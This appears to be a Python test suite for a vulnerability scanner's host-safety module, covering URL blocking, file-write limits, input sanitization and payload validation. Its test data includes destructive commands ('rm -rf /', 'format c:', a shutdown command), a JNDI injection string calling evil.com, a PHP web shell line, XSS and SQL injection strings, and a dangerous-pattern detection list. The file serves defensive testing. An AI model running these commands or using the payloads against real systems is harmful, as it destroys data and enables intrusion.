#!/usr/bin/env python3
"""
Host Safety Test Script

This script validates that all host safety measures are working correctly
to protect the machine during scanning operations.
"""

import sys
import os
import tempfile
from pathlib import Path

# Add the project root to the path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from scanner.safety import get_safety_manager, safe_file_write, safe_url_request

def test_url_validation():
    """Test URL validation and blocking of unsafe targets."""
    print("[TEST] Testing URL Validation...")
    
    safety = get_safety_manager()
    
    # Test cases: (url, should_be_allowed, description)
    test_cases = [
        # Safe URLs (should be allowed)
        ("https://example.com", True, "External HTTPS URL"),
        ("http://httpbin.org", True, "External HTTP URL"),
        ("https://www.google.com/search?q=test", True, "External URL with query"),
        
        # Unsafe URLs (should be blocked)
        ("http://localhost:8080", False, "Localhost with port"),
        ("https://127.0.0.1", False, "Localhost IP"),
        ("http://192.168.1.1", False, "Private network Class C"),
        ("https://10.0.0.1", False, "Private network Class A"),
        ("http://172.16.0.1", False, "Private network Class B"),
        ("file:///etc/passwd", False, "File scheme"),
        ("ftp://example.com", False, "FTP scheme"),
        ("javascript:alert(1)", False, "JavaScript scheme"),
        ("", False, "Empty URL"),
        ("not-a-url", False, "Invalid URL format"),
    ]
    
    passed = 0
    failed = 0
    
    for url, should_allow, description in test_cases:
        try:
            result = safety.validate_url(url)
            if result == should_allow:
                print(f"  [OK] {description}: {url} -> {'ALLOWED' if result else 'BLOCKED'}")
                passed += 1
            else:
                print(f"  [FAIL] {description}: {url} -> Expected {'ALLOWED' if should_allow else 'BLOCKED'}, got {'ALLOWED' if result else 'BLOCKED'}")
                failed += 1
        except Exception as e:
            print(f"  [ERROR] {description}: {url} -> ERROR: {e}")
            failed += 1
    
    print(f"\n[RESULTS] URL Validation Results: {passed} passed, {failed} failed\n")
    return failed == 0

def test_file_write_validation():
    """Test file write validation and path restrictions."""
    print("[TEST] Testing File Write Validation...")
    
    safety = get_safety_manager()
    project_root = Path(__file__).parent
    
    # Test cases: (path, should_be_allowed, description)
    test_cases = [
        # Safe paths (should be allowed)
        (project_root / "reports" / "test_report.json", True, "Reports directory"),
        (project_root / "logs" / "test.log", True, "Logs directory"),
        
        # Unsafe paths (should be blocked)
        ("/etc/passwd", False, "System file"),
        ("C:\\Windows\\System32\\test.txt", False, "Windows system directory"),
        (project_root / ".." / "dangerous.txt", False, "Parent directory"),
        (project_root / "scanner" / "test.py", False, "Source code directory"),
        (tempfile.gettempdir() + "/test.txt", False, "Temp directory"),
        ("", False, "Empty path"),
    ]
    
    passed = 0
    failed = 0
    
    for path, should_allow, description in test_cases:
        try:
            result = safety.validate_file_write(str(path))
            if result == should_allow:
                print(f"  [OK] {description}: {path} -> {'ALLOWED' if result else 'BLOCKED'}")
                passed += 1
            else:
                print(f"  [FAIL] {description}: {path} -> Expected {'ALLOWED' if should_allow else 'BLOCKED'}, got {'ALLOWED' if result else 'BLOCKED'}")
                failed += 1
        except Exception as e:
            print(f"  [ERROR] {description}: {path} -> ERROR: {e}")
            failed += 1
    
    print(f"\n[RESULTS] File Write Validation Results: {passed} passed, {failed} failed\n")
    return failed == 0

def test_input_sanitization():
    """Test input sanitization and dangerous pattern detection."""
    print("[TEST] Testing Input Sanitization...")
    
    safety = get_safety_manager()
    
    # Test cases: (input, description)
    test_cases = [
        ("normal input text", "Normal text"),
        ("SELECT * FROM users", "SQL query"),
        ("<script>alert('xss')</script>", "XSS script tag"),
        ("javascript:alert(1)", "JavaScript URL"),
        ("eval('malicious code')", "eval() call"),
        ("import os; os.system('rm -rf /')", "Import statement"),
        ("'; DROP TABLE users; --", "SQL injection"),
        ("${jndi:ldap://evil.com/a}", "JNDI injection"),
        ("{{7*7}}", "Template injection"),
        ("rm -rf /", "Destructive command"),
        ("shutdown /s /t 0", "Windows shutdown"),
        ("A" * 20000, "Very long input"),
    ]
    
    passed = 0
    failed = 0
    
    for input_text, description in test_cases:
        try:
            sanitized = safety.sanitize_input(input_text)
            
            # Check that dangerous patterns are removed
            dangerous_patterns = ['<script', 'javascript:', 'eval(', 'import ', 'rm -rf', 'shutdown']
            has_dangerous = any(pattern in sanitized.lower() for pattern in dangerous_patterns)
            
            if not has_dangerous and len(sanitized) <= 10000:
                print(f"  [OK] {description}: Sanitized successfully")
                passed += 1
            else:
                print(f"  [FAIL] {description}: Sanitization failed - dangerous patterns remain or too long")
                failed += 1
        except Exception as e:
            print(f"  [ERROR] {description}: ERROR: {e}")
            failed += 1
    
    print(f"\n[RESULTS] Input Sanitization Results: {passed} passed, {failed} failed\n")
    return failed == 0

def test_payload_validation():
    """Test payload validation for scan parameters."""
    print("[TEST] Testing Payload Validation...")
    
    safety = get_safety_manager()
    
    # Test cases: (payload, should_be_valid, description)
    test_cases = [
        # Valid payloads
        ("' OR 1=1 --", True, "SQL injection payload"),
        ("<img src=x onerror=alert(1)>", True, "XSS payload"),
        ("../../../etc/passwd", True, "Directory traversal"),
        ("normal test data", True, "Normal text"),
        
        # Invalid payloads (too dangerous or long)
        ("rm -rf /", False, "Destructive command"),
        ("format c:", False, "Format command"),
        ("<?php system($_GET['cmd']); ?>", False, "PHP code"),
        ("A" * 10000, False, "Too long payload"),
        ("shutdown /s /t 0", False, "Shutdown command"),
    ]
    
    passed = 0
    failed = 0
    
    for payload, should_be_valid, description in test_cases:
        try:
            result = safety.validate_payload(payload)
            if result == should_be_valid:
                print(f"  [OK] {description}: {'VALID' if result else 'BLOCKED'}")
                passed += 1
            else:
                print(f"  [FAIL] {description}: Expected {'VALID' if should_be_valid else 'BLOCKED'}, got {'VALID' if result else 'BLOCKED'}")
                failed += 1
        except Exception as e:
            print(f"  [ERROR] {description}: ERROR: {e}")
            failed += 1
    
    print(f"\n[RESULTS] Payload Validation Results: {passed} passed, {failed} failed\n")
    return failed == 0

def test_resource_monitoring():
    """Test resource monitoring functionality."""
    print("[TEST] Testing Resource Monitoring...")
    
    safety = get_safety_manager()
    
    try:
        # Test resource monitoring
        stats = safety.check_resource_usage()
        
        required_keys = ['memory_mb', 'cpu_percent', 'open_files', 'thread_count', 'uptime_seconds']
        missing_keys = [key for key in required_keys if key not in stats]
        
        if not missing_keys:
            print(f"  [OK] Resource monitoring working")
            print(f"    Memory: {stats['memory_mb']:.1f}MB")
            print(f"    CPU: {stats['cpu_percent']:.1f}%")
            print(f"    Open Files: {stats['open_files']}")
            print(f"    Threads: {stats['thread_count']}")
            print(f"    Uptime: {stats['uptime_seconds']:.1f}s")
            return True
        else:
            print(f"  [FAIL] Resource monitoring failed - missing keys: {missing_keys}")
            return False
            
    except Exception as e:
        print(f"  [ERROR] Resource monitoring failed: {e}")
        return False

def test_safe_file_operations():
    """Test safe file write operations."""
    print("[TEST] Testing Safe File Operations...")
    
    project_root = Path(__file__).parent
    test_file = project_root / "reports" / "safety_test.txt"
    test_content = "This is a safety test file."
    
    try:
        # Test safe file write
        result = safe_file_write(str(test_file), test_content)
        
        if result and test_file.exists():
            # Verify content
            with open(test_file, 'r', encoding='utf-8') as f:
                content = f.read()
            
            if content == test_content:
                print(f"  [OK] Safe file write successful: {test_file}")
                # Clean up
                test_file.unlink()
                return True
            else:
                print(f"  [FAIL] File content mismatch")
                return False
        else:
            print(f"  [FAIL] Safe file write failed")
            return False
            
    except Exception as e:
        print(f"  Safe file operations failed: {e}")
        return False

def main():
    """Run all host safety tests."""
    print("[SAFETY] Host Safety Test Suite")
    print("=" * 50)
    
    tests = [
        ("URL Validation", test_url_validation),
        ("File Write Validation", test_file_write_validation),
        ("Input Sanitization", test_input_sanitization),
        ("Payload Validation", test_payload_validation),
        ("Resource Monitoring", test_resource_monitoring),
        ("Safe File Operations", test_safe_file_operations),
    ]
    
    passed_tests = 0
    total_tests = len(tests)
    
    for test_name, test_func in tests:
        try:
            if test_func():
                passed_tests += 1
        except Exception as e:
            print(f"[ERROR] {test_name} failed with exception: {e}")
    
    print("=" * 50)
    print(f"[RESULTS] Test Results: {passed_tests}/{total_tests} tests passed")
    
    if passed_tests == total_tests:
        print("[SUCCESS] All host safety measures are working correctly!")
        print("[PROTECTED] Your machine is protected during scanning operations.")
        return 0
    else:
        print("[WARNING] Some safety measures failed. Please review the results above.")
        return 1

if __name__ == "__main__":
    sys.exit(main())
